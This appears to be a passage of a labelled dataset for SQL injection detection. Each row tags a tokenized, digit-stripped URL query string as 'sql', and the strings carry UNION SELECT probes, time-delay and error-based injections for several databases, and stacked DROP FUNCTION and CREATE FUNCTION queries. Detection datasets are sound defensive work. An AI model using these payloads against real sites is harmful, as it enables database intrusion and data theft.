3197,sql,". . . . / / ? = & =   ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3198,sql,". . . . / ? = & =   "" ) AND SLEEP ( ) # "
3199,sql,". . . . / / / / ? = & =   ( SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END ) ) "
3200,sql,". . . / / / ? =   ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM DUAL UNION SELECT  FROM DUAL ) END ) "
3201,sql,". . / ? = & =   ORDER BY  -- "
3202,sql,". . . ? = & =   ' ) ) AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ( ' oRDv ' = ' "
3203,sql,". . ? = & = & = & =  - "" ) UNION ALL SELECT ,  -- "
3204,sql,". . / / / ? = & = & = & =   ' ) ; WAITFOR DELAY ' : : '  --"
3205,sql,". . / ? = & = & =   % ' UNION ALL SELECT NULL # "
3206,sql,". . . . / / / / ? = & =   % ' ) AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( ' % ' = ' "
3207,sql,". . / / ? = & = & =  - % ' ) UNION ALL SELECT , , ,  -- "
3208,sql,". . . . / / / ? = & =   "" ) ) AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ( " PgiZ " = " "
3209,sql,". . . . / / / ? = & =   UNION ALL SELECT NULL # "
3210,sql,". . / / / / ? = & = & = & =   "" AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND " zwgm " = " "
3211,sql,". . / / ? = & =   "" ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( " CEGp " = " "
3212,sql,". . / / / ? = & = & =   ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL -- "
3213,sql,". . . / / / ? =   "" AND SLEEP ( ) AND " dgtj " = " "
3214,sql,". . / / / / ? = & = & =   ' AND = AND ' bNNu ' = ' "
3215,sql,". . / / ? = & = & = & =   UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3216,sql,". . . . ? = & = & =  - ' ) UNION ALL SELECT , , , , ,  -- "
3217,sql,". . . . / / ? = & = & =   % ' RLIKE SLEEP ( ) AND ' % ' = ' "
3218,sql,". . . . / ? = & = & =   "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
3219,sql,". . / / / ? = & = & =  - ) UNION ALL SELECT , , , , , , , , , # "
3220,sql,". . . / / ? = & = & = & =   ' ) ) AND = ( SELECT  FROM PG_SLEEP ( ) ) AND ( ( ' dlRN ' LIKE ' "
3221,sql,". . / ? = & =   ( CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) ) "
3222,sql,". . / / / ? =   ) ) ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ( ( = "
3223,sql,". . . / ? = & =   % ' AND = % "
3224,sql,". . / / / ? = & = & =  - % ' ) ) UNION ALL SELECT , , , , , , , , # "
3225,sql,". . . / ? = & =   ' ) ) AND =  -- "
3226,sql,". . / / / / ? = & =   % "" ; IF ( = ) SELECT  ELSE DROP FUNCTION UUex --"
3227,sql,". . . . / / / ? = & = & = & =  - UNION ALL SELECT , , # "
3228,sql,". . / / ? = & = & =   "" ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( " BGOQ " = " "
3229,sql,". . . ? =   AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) "
3230,sql,". . . ? = & =   ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL # "
3231,sql,". . . . / ? = & = & =   ' ) ) RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UfpP ) AND ( ( ' ZmFd ' = ' "
3232,sql,". . / / / ? =   "" AND MAKE_SET ( = , ) AND " LuJw " = " "
3233,sql,". . / ? =   ( CASE WHEN ( = ) THEN ' ' ELSE * ( SELECT  FROM DUAL UNION SELECT  FROM DUAL ) END ) "
3234,sql,". . / / ? = & =  - UNION ALL SELECT # "
3235,sql,". . . ? = & =  - ' ) ) UNION ALL SELECT , , ,  -- "
3236,sql,". . / ? = & = & = & =    AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) "
3237,sql,". . / / / / ? = & =  - "" UNION ALL SELECT , , , , , ,  -- "
3238,sql,". . . / ? = & =  - % ' ) UNION ALL SELECT , , , ,  -- "
3239,sql,". . . ? = & =   ' ) ) ) AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND ( ( ( ' Omke ' = ' "
3240,sql,". . . . / / ? = & = & = & =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3241,sql,". . . / / / ? = & =  - ' UNION ALL SELECT , ,  -- "
3242,sql,". . . . / / / / ? = & =   ' ) AND ELT ( = , SLEEP ( ) ) AND ( ' kSWm ' LIKE ' "
3243,sql,". . / / ? = & =  - ' UNION ALL SELECT # "
3244,sql,". . . . / ? = & =   "" ) ) AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ( ( " grDk " = " "
3245,sql,". . / / / / ? =  - ) ) ) UNION ALL SELECT , , , , , , , ,  -- "
3246,sql,". . . . / / ? = & = & = & =  - ' UNION ALL SELECT , ,  -- "
3247,sql,". . . . ? =  - ) UNION ALL SELECT , , , # "
3248,sql,". . . / ? =   % ' WAITFOR DELAY ' : : ' AND ' % ' = ' "
3249,sql,". . / / / ? = & = & =   "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3250,sql,". . . / / / / ? =  - ) ) ) UNION ALL SELECT , , , , , , # "
3251,sql,". . . / / / / ? = & =   % "" UNION ALL SELECT NULL , NULL # "
3252,sql,". . . ? = & = & = & =   % ' ORDER BY # "
3253,sql,". . . . ? =   ' ) UNION ALL SELECT NULL # "
3254,sql,". . . . / ? = & = & = & =   % "" UNION ALL SELECT NULL , NULL # "
3255,sql,". . . / / / / ? =   ' ) ; SELECT PG_SLEEP ( )  --"
3256,sql,". . . ? = & = & = & =   ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL -- "
3257,sql,". . . . / / ? = & = & =   "" ) AND ELT ( = , SLEEP ( ) ) AND ( " RBsK " = " "
3258,sql,". . . / / / ? = & =   % "" AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND " % " = " "
3259,sql,". . . . / / ? = & = & = & =   % ' ) ) AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ( ( ' % ' = ' "
3260,sql,". . . . / / / / ? = & = & = & =   ' ) ) ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ( ( ' okJA ' = ' "
3261,sql,". . / / / / ? = & = & =   "" ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( " dkAW " = " "
3262,sql,". . ? = & = & =   ' AND =  -- "
3263,sql,". . ? = & = & = & =   ' AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND ' QkZj ' LIKE ' "
3264,sql,". . . . / / ? = & = & = & =   % ' ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( ( ' % ' = ' "
3265,sql,". . . / ? = & = & =   % ' ) ) ; SELECT SLEEP ( ) # "
3266,sql,". . . / / / / ? = & =   "" ) ) AND =  -- "
3267,sql,". . . . / / ? =   ) ; SELECT SLEEP ( )  -- "
3268,sql,". . . . ? =   ) AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) )  -- "
3269,sql,". . . . ? = & = & =   ' ) ) ) AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ( ( ( ' Uhrk ' = ' "
3270,sql,". . . . / / ? =   ' AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x )  -- "
3271,sql,". . / / ? = & =  - ) ) UNION ALL SELECT , , , , , , , ,  -- "
3272,sql,". . . . / / / ? = & =   ' ) ) AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND ( ( ' bcQw ' LIKE ' "
3273,sql,". . ? =   "" ; IF ( = ) SELECT  ELSE DROP FUNCTION OHvz --"
3274,sql,". . . . / / / ? =  - % "" UNION ALL SELECT , , , # "
3275,sql,". . . . ? = & = & = & =   % "" ORDER BY  -- "
3276,sql,". . . ? = & = & = & =   AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC )  -- "
3277,sql,". . . ? =   "" ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
3278,sql,". . . . / / / / ? = & = & = & =   "" AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND " qvDZ " = " "
3279,sql,". . . / / ? = & = & =   ' ) ) AND ELT ( = , SLEEP ( ) ) AND ( ( ' szDw ' = ' "
3280,sql,". . . . ? =   , ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) "
3281,sql,". . / / ? = & = & =  - "" UNION ALL SELECT , # "
3282,sql,". . . . / / ? = & = & = & =   ' ) ) ) UNION ALL SELECT NULL , NULL , NULL , NULL # "
3283,sql,". . / / / / ? = & = & = & =  - % ' ) ORDER BY  -- "
3284,sql,". . . . / ? = & =    UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL -- "
3285,sql,". . . / / / ? =   ) AND MAKE_SET ( = , )  -- "
3286,sql,". . . . / / ? = & = & = & =   "" ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3287,sql,". . . . / / / / ? =   % ' ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( ' % ' = ' "
3288,sql,". . . / / / / ? = & =   ' ) ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3289,sql,". . . . ? =   ) ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL # "
3290,sql,". . / ? = & = & = & =  - ) UNION ALL SELECT , , , , , , ,  -- "
3291,sql,". . ? =   ) AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC )  -- "
3292,sql,". . ? =   ' ) ) WAITFOR DELAY ' : : ' AND ( ( ' wDOC ' LIKE ' "
3293,sql,". . . ? = & = & = & =   ' ) ) ) ORDER BY # "
3294,sql,". . ? = & = & =   ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL -- "
3295,sql,". . . ? = & =   "" ) AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( " jula " LIKE " "
3296,sql,". . . . / ? = & = & = & =   ' ) ) AND = AND ( ( ' rzMm ' LIKE ' "
3297,sql,". . / ? =   ) ) ) AND SLEEP ( ) AND ( ( ( = "
3298,sql,". . / / ? =  - UNION ALL SELECT , , , , , , , , , # "
3299,sql,". . / / / / ? = & = & = & =   ) ) ) AND = # "
3300,sql,". . . / ? = & = & = & =   ' AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ' OiSK ' LIKE ' "
3301,sql,". . ? = & =   ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL -- "
3302,sql,". . / / / / ? = & = & = & =  - ) ) UNION ALL SELECT # "
3303,sql,". . ? =   ' ) ) RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UfpP ) AND ( ( ' RNNu ' LIKE ' "
3304,sql,". . . / ? =  - % ' ) ) UNION ALL SELECT , , , , , ,  -- "
3305,sql,". . ? = & = & = & =   "" AND = % "
3306,sql,". . . / / ? = & = & = & =   ' ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ' uNEo ' = ' "
3307,sql,". . . / / / ? = & =  - ) ) UNION ALL SELECT , , ,  -- "
3308,sql,". . / / / / ? = & =   "" ) ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ( ( " SEWd " = " "
3309,sql,". . . . / / / ? =   ) ) ) AND = # "
3310,sql,". . . . / / / / ? = & =   ' ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( ' OOjh ' = ' "
3311,sql,". . / / ? =   ' ) ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
3312,sql,". . . / ? = & =   ' ) AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ' hIDJ ' = ' "
3313,sql,". . / / ? =  - ) ) ) UNION ALL SELECT , , , ,  -- "
3314,sql,". . . / / ? = & =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3315,sql,". . / / / / ? = & = & = & =   ' ORDER BY  -- "
3316,sql,". . . . / ? = & = & = & =  - ) ) ) UNION ALL SELECT , , , , , # "
3317,sql,". . . . / ? = & = & =   "" AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND " hzLE " LIKE " "
3318,sql,". . ? = & = & =  - ) ) ) UNION ALL SELECT , , , , , ,  -- "
3319,sql,". . ? = & = & =   ' ) ) RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) Irzi ) AND ( ( ' DktP ' LIKE ' "
3320,sql,". . . . ? = & = & =   "" ) AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND ( " cGME " LIKE " "
3321,sql,". . . . / / / / ? = & = & = & =   % ' ) ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN xaffdedeafffe ELSE x END ) ) AND ( ( ' % ' = ' "
3322,sql,". . . . / ? =   ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) )  -- "
3323,sql,". . . . ? = & = & = & =   ' ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( ' noke ' = ' "
3324,sql,". . . . / / / ? = & =   "" ) ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN  ELSE x END ) ) AND ( ( " rnxG " = " "
3325,sql,". . . . / ? =  - ' UNION ALL SELECT , , , , , , , ,  -- "
3326,sql,". . . ? = & = & =   "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3327,sql,". . . . / / / ? =   ' ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( ' gWLJ ' LIKE ' "
3328,sql,". . . . ? = & =  - ' UNION ALL SELECT ,  -- "
3329,sql,". . . / / / ? = & =    UNION ALL SELECT NULL , NULL , NULL , NULL # "
3330,sql,". . ? =   ' AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ' Bvzo ' = ' "
3331,sql,". . . . / / ? = & = & = & =  - ' ) ) ) UNION ALL SELECT , , , # "
3332,sql,". . . . / / / ? = & =   ' ) ) ) ORDER BY  -- "
3333,sql,". . . / ? = & =    AND =  -- "
3334,sql,". . . . / / / / ? = & =   ' ) ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ( ( ' PiGE ' = ' "
3335,sql,". . . / / / ? = & = & =  - ' ) UNION ALL SELECT , , , , , , ,  -- "
3336,sql,". . . ? = & = & = & =   ) ; SELECT SLEEP ( ) AND ( = "
3337,sql,". . . ? = & = & =   ' ) ) AND SLEEP ( ) AND ( ( ' iypb ' = ' "
3338,sql,". . / / / ? = & = & = & =   "" ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( " XfxM " LIKE " "
3339,sql,". . . . / / / ? =   "" ) AND SLEEP ( ) AND ( " KCTH " LIKE " "
3340,sql,". . . / ? = & = & = & =   ( CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) ) "
3341,sql,". . / ? = & =   ' RLIKE ( SELECT ( CASE WHEN ( = ) THEN xcdfeecaffcdef ELSE x END ) ) AND ' HCVE ' LIKE ' "
3342,sql,". . / / ? = & = & =   ' ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( ' cbJM ' = ' "
3343,sql,". . . / / / ? =   ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( = "
3344,sql,". . . / ? =   % ' AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ' % ' = ' "
3345,sql,". . ? = & =   % "" AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND " % " = " "
3346,sql,". . / / / / ? = & = & = & =   "" UNION ALL SELECT NULL , NULL , NULL , NULL # "
3347,sql,". . / / / ? =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL -- "
3348,sql,". . . . / ? = & = & = & =   ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3349,sql,". . . / / ? =   ; IF ( = ) SELECT  ELSE DROP FUNCTION XaYM --"
3350,sql,". . . . / / ? = & =  - ) UNION ALL SELECT , , # "
3351,sql,". . . / ? =   ' ) UNION ALL SELECT NULL , NULL -- "
3352,sql,". . . / / / ? = & = & = & =   ' ; SELECT PG_SLEEP ( )  --"
3353,sql,". . . . ? =   "" AND = AND " FiVx " LIKE " "
3354,sql,". . . / / / ? =   ' AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ' Bcji ' = ' "
3355,sql,". . . / ? = & =   ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3356,sql,". . . / / / / ? =   ' ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ' AoPc ' LIKE ' "
3357,sql,". . / / ? = & =   % ' ) ) AND MAKE_SET ( = , ) AND ( ( ' % ' = ' "
3358,sql,". . . / / / / ? =   "" ) ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( ( " VZyZ " = " "
3359,sql,". . / / ? =   ' kyNEcG< ' "" >"
3360,sql,". . . ? =   % ' ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL # "
3361,sql,". . . / / ? = & = & =  - "" ) UNION ALL SELECT , , , , , , ,  -- "
3362,sql,". . . / / / ? = & =   % ' ) AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ' % ' = ' "
3363,sql,". . . . / / / ? = & = & = & =  - ' ) ) UNION ALL SELECT , , # "
3364,sql,". . . . ? =   % "" AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UygZ ) AND " % " = " "
3365,sql,". . . . ? =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3366,sql,". . / ? = & = & =   % ' AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ' % ' = ' "
3367,sql,". . . / ? = & =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3368,sql,". . ? = & = & = & =   % "" AND MAKE_SET ( = , ) AND " % " = " "
3369,sql,". . / / / / ? =    UNION ALL SELECT NULL , NULL -- "
3370,sql,". . . / / / / ? =   ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3371,sql,". . . / / / ? =  - ) UNION ALL SELECT , , , , , # "
3372,sql,". . / / / / ? = & = & = & =  - ' ) UNION ALL SELECT , , , , , # "
3373,sql,". . / / / ? = & = & = & =   ' ) ) AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ( ' cOPv ' = ' "
3374,sql,". . . / ? = & = & =   ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3375,sql,". . / ? = & =  - ' ) ) ) UNION ALL SELECT , , , , , , , ,  -- "
3376,sql,". . / / / / ? = & = & = & =   ' , ( SELECT ( CASE WHEN ( = ) THEN xaffdedeafffe ELSE * ( SELECT  FROM INFORMATION_SCHEMA . PLUGINS ) END ) )  -- "
3377,sql,". . / / / / ? = & = & =   AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS "
3378,sql,". . . / ? = & =   "" AND =  -- "
3379,sql,". . . . / / / / ? =  - UNION ALL SELECT , , , ,  -- "
3380,sql,". . . . ? =   ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
3381,sql,". . . . / / ? = & = & =  - UNION ALL SELECT  -- "
3382,sql,". . / / / ? =   ' ) ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN xaffdedeafffe ELSE x END ) ) AND ( ( ' jHfK ' = ' "
3383,sql,". . . . / ? =    UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3384,sql,". . / / ? = & =   ) AND =  -- "
